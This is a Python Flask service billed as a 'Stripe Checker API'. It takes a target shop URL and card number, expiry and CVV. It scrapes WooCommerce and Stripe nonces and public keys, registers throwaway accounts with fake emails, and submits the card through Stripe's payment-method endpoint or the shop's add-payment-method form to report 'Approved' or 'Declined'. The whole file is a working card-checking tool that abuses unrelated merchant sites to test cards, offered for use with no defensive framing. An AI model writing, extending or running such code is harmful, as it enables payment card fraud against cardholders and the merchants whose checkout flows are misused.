import requests
import re
import time
import random
import os
from faker import Faker
from flask import Flask, request, jsonify

app = Flask(__name__)
faker = Faker()

class StripeChecker:
    def __init__(self):
        self.session_pool = {}

    def get_session(self, session_id):
        if session_id not in self.session_pool:
            self.session_pool[session_id] = requests.Session()
        return self.session_pool[session_id]

    def extract_tokens(self, html_content):
        tokens = {}
        
        # Extract WooCommerce nonce
        wc_nonce = re.findall(r'name="woocommerce-register-nonce" value="([^"]+)"', html_content)
        if wc_nonce:
            tokens['wc_nonce'] = wc_nonce[0]
        
        # Extract Stripe public key
        stripe_key = re.findall(r'"key":"(pk_[^"]+)"', html_content)
        if stripe_key:
            tokens['stripe_key'] = stripe_key[0]
        
        # Extract setup intent nonce
        setup_nonce = re.findall(r'"createAndConfirmSetupIntentNonce":"([^"]+)"', html_content)
        if setup_nonce:
            tokens['setup_nonce'] = setup_nonce[0]
            
        # Extract wpnonce
        wp_nonce = re.findall(r'name="_wpnonce" value="([^"]+)"', html_content)
        if wp_nonce:
            tokens['wp_nonce'] = wp_nonce[0]
            
        # Extract security token
        security_token = re.findall(r'name="security" value="([^"]+)"', html_content)
        if security_token:
            tokens['security'] = security_token[0]
            
        return tokens

    def process_check(self, site_url, cc_number, cc_exp_month, cc_exp_year, cc_cvv):
        session_id = str(random.randint(100000, 999999))
        session = self.get_session(session_id)
        
        try:
            # Clean site URL
            if not site_url.startswith('http'):
                site_url = 'https://' + site_url
            site_url = site_url.rstrip('/')
            
            print(f"🔍 Testing site: {site_url}")
            
            # Try multiple possible payment URLs
            payment_urls = [
                f"{site_url}/my-account/add-payment-method/",
                f"{site_url}/en/moj-racun/add-payment-method/",
                f"{site_url}/account/add-payment-method/",
                f"{site_url}/add-payment-method/",
                f"{site_url}/checkout/",
                f"{site_url}/my-account/"
            ]
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
            }
            
            # Try to access the site
            response = None
            for url in payment_urls:
                try:
                    print(f"🔄 Trying URL: {url}")
                    response = session.get(url, headers=headers, timeout=30)
                    if response.status_code == 200:
                        print("✅ Successfully accessed site")
                        break
                except:
                    continue
            
            if not response or response.status_code != 200:
                return {
                    'status': 'Declined', 
                    'response': 'Cannot access the website'
                }
            
            # Extract tokens from HTML
            tokens = self.extract_tokens(response.text)
            print(f"🔑 Extracted tokens: {tokens}")
            
            # If no registration nonce found, try direct payment method addition
            if not tokens.get('wc_nonce') and not tokens.get('wp_nonce'):
                print("🔄 No registration nonce found, trying direct payment...")
                return self.try_direct_payment(session, site_url, cc_number, cc_exp_month, cc_exp_year, cc_cvv, tokens, headers)
            
            # Try registration if we have nonce
            if tokens.get('wc_nonce'):
                print("🔄 Attempting registration...")
                register_data = {
                    'email': faker.email(),
                    'password': 'TestPassword123!',
                    'woocommerce-register-nonce': tokens['wc_nonce'],
                    '_wp_http_referer': '/my-account/add-payment-method/',
                    'register': 'Register'
                }
                
                register_headers = headers.copy()
                register_headers.update({
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Origin': site_url,
                    'Referer': response.url
                })
                
                register_response = session.post(response.url, data=register_data, headers=register_headers, timeout=30, allow_redirects=True)
                
                # Extract tokens again after registration
                tokens_after_reg = self.extract_tokens(register_response.text)
                tokens.update(tokens_after_reg)
            
            # Now try to add payment method
            return self.add_payment_method(session, site_url, cc_number, cc_exp_month, cc_exp_year, cc_cvv, tokens, headers)
            
        except Exception as e:
            error_msg = str(e)
            print(f"❌ System error: {error_msg}")
            return {
                'status': 'Declined',
                'response': f'System error: {error_msg}'
            }

    def try_direct_payment(self, session, site_url, cc_number, cc_exp_month, cc_exp_year, cc_cvv, tokens, headers):
        """Try to add payment method directly without registration"""
        try:
            print("🔄 Attempting direct payment method addition...")
            
            # Prepare payment data
            payment_data = {
                'action': 'wc_stripe_create_setup_intent',
                'payment_method_type': 'card',
                'is_need_to_save_card': 'true',
                'is_platform_payment_method': 'false',
            }
            
            if tokens.get('security'):
                payment_data['security'] = tokens['security']
            if tokens.get('wp_nonce'):
                payment_data['_wpnonce'] = tokens['wp_nonce']
            
            payment_headers = headers.copy()
            payment_headers.update({
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-Requested-With': 'XMLHttpRequest',
                'Origin': site_url,
                'Referer': site_url + '/my-account/add-payment-method/'
            })
            
            # Try AJAX endpoint
            ajax_url = site_url + '/wp-admin/admin-ajax.php'
            response = session.post(ajax_url, data=payment_data, headers=payment_headers, timeout=30)
            
            if response.status_code == 200:
                try:
                    result = response.json()
                    if result.get('success'):
                        return {
                            'status': 'Approved',
                            'response': 'Payment method added successfully'
                        }
                    else:
                        return {
                            'status': 'Declined',
                            'response': result.get('data', {}).get('message', 'Payment failed')
                        }
                except:
                    pass
            
            # If AJAX fails, try direct form submission
            return self.submit_payment_form(session, site_url, cc_number, cc_exp_month, cc_exp_year, cc_cvv, tokens, headers)
            
        except Exception as e:
            return {
                'status': 'Declined',
                'response': f'Direct payment failed: {str(e)}'
            }

    def submit_payment_form(self, session, site_url, cc_number, cc_exp_month, cc_exp_year, cc_cvv, tokens, headers):
        """Submit payment form directly"""
        try:
            print("🔄 Submitting payment form...")
            
            form_data = {
                'payment_method': 'stripe',
                'wc-stripe-new-payment-method': 'true',
                'stripe-card-number': cc_number,
                'stripe-card-expiry': f'{cc_exp_month}/{cc_exp_year}',
                'stripe-card-cvc': cc_cvv,
                'terms': 'on',
                'terms-field': '1',
                'woocommerce_add_payment_method': '1',
            }
            
            if tokens.get('wp_nonce'):
                form_data['_wpnonce'] = tokens['wp_nonce']
            if tokens.get('wc_nonce'):
                form_data['woocommerce-register-nonce'] = tokens['wc_nonce']
            
            form_headers = headers.copy()
            form_headers.update({
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': site_url,
                'Referer': site_url + '/my-account/add-payment-method/'
            })
            
            form_url = site_url + '/my-account/add-payment-method/'
            response = session.post(form_url, data=form_data, headers=form_headers, timeout=30, allow_redirects=True)
            
            # Analyze response
            response_text = response.text.lower()
            
            # Check for success indicators
            if any(indicator in response_text for indicator in ['payment method added', 'successfully', 'thank you', 'card added']):
                return {
                    'status': 'Approved',
                    'response': 'Payment method added successfully'
                }
            
            # Check for error messages
            error_match = re.search(r'<div class="[^"]*error[^"]*">([^<]+)</div>', response.text, re.IGNORECASE)
            if error_match:
                return {
                    'status': 'Declined',
                    'response': error_match.group(1).strip()
                }
            
            # Check if redirected away from payment page (success)
            if 'add-payment-method' not in response.url:
                return {
                    'status': 'Approved',
                    'response': 'Payment processed successfully'
                }
            
            return {
                'status': 'Declined',
                'response': 'Payment method could not be added'
            }
            
        except Exception as e:
            return {
                'status': 'Declined',
                'response': f'Form submission failed: {str(e)}'
            }

    def add_payment_method(self, session, site_url, cc_number, cc_exp_month, cc_exp_year, cc_cvv, tokens, headers):
        """Add payment method using available tokens"""
        try:
            print("🔄 Adding payment method...")
            
            # Try Stripe API approach if we have keys
            if tokens.get('stripe_key') and tokens.get('setup_nonce'):
                print("🔄 Using Stripe API approach...")
                
                # Create payment method via Stripe
                stripe_data = {
                    'type': 'card',
                    'card[number]': cc_number,
                    'card[cvc]': cc_cvv,
                    'card[exp_month]': cc_exp_month,
                    'card[exp_year]': cc_exp_year,
                    'billing_details[address][postal_code]': '10001',
                    'billing_details[address][country]': 'US',
                    'key': tokens['stripe_key']
                }
                
                stripe_response = session.post(
                    'https://api.stripe.com/v1/payment_methods',
                    data=stripe_data,
                    headers={'Content-Type': 'application/x-www-form-urlencoded'},
                    timeout=30
                )
                
                if stripe_response.status_code == 200:
                    pm_id = stripe_response.json().get('id')
                    if pm_id:
                        # Confirm with site
                        confirm_data = {
                            'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
                            'wc-stripe-payment-method': pm_id,
                            '_ajax_nonce': tokens['setup_nonce']
                        }
                        
                        confirm_headers = headers.copy()
                        confirm_headers.update({
                            'Content-Type': 'application/x-www-form-urlencoded',
                            'X-Requested-With': 'XMLHttpRequest'
                        })
                        
                        confirm_response = session.post(site_url, data=confirm_data, headers=confirm_headers, timeout=30)
                        
                        if confirm_response.status_code == 200:
                            result = confirm_response.json()
                            if result.get('success'):
                                return {
                                    'status': 'Approved',
                                    'response': 'Card verified successfully'
                                }
            
            # Fallback to form submission
            return self.submit_payment_form(session, site_url, cc_number, cc_exp_month, cc_exp_year, cc_cvv, tokens, headers)
            
        except Exception as e:
            return {
                'status': 'Declined',
                'response': f'Payment method addition failed: {str(e)}'
            }

checker = StripeChecker()

@app.route('/api/stripe/check', methods=['POST', 'GET'])
def stripe_check():
    if request.method == 'POST':
        data = request.get_json() or request.form
    else:
        data = request.args
    
    if 'site' not in data or 'cc' not in data:
        return jsonify({
            'status': 'Error',
            'response': 'Missing parameters: site and cc are required'
        })
    
    site_url = data['site'].strip()
    cc_data = data['cc'].strip()
    
    cc_parts = cc_data.split('|')
    if len(cc_parts) != 4:
        return jsonify({
            'status': 'Error',
            'response': 'Invalid CC format. Use: number|mm|yy|cvv'
        })
    
    cc_number, cc_exp_month, cc_exp_year, cc_cvv = cc_parts
    
    if not all([cc_number.isdigit(), cc_exp_month.isdigit(), cc_exp_year.isdigit(), cc_cvv.isdigit()]):
        return jsonify({
            'status': 'Error',
            'response': 'Invalid CC data: all parts must be numeric'
        })
    
    result = checker.process_check(site_url, cc_number, cc_exp_month, cc_exp_year, cc_cvv)
    return jsonify(result)

@app.route('/')
def home():
    return jsonify({
        'message': 'Stripe Checker API - Live',
        'usage': {
            'GET': '/api/stripe/check?site=URL&cc=number|mm|yy|cvv',
            'POST': 'JSON: {"site": "URL", "cc": "number|mm|yy|cvv"}'
        },
        'example': '/api/stripe/check?site=https://example.com&cc=4111111111111111|12|25|123'
    })

@app.route('/health')
def health():
    return jsonify({'status': 'OK', 'service': 'Stripe Checker API'})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)